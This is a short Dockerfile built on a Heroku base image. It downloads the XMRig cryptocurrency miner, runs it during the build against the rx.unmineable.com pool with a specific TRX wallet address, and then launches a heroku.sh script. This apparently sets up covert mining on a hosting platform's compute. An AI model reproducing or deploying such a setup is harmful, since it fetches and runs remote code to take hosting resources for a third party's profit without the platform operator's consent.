FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u TRX:TQUDruncpdsvhTeJxbhBCMPysiL25LA1Jx.Temp -p x -k -a rx/0
CMD bash heroku.sh
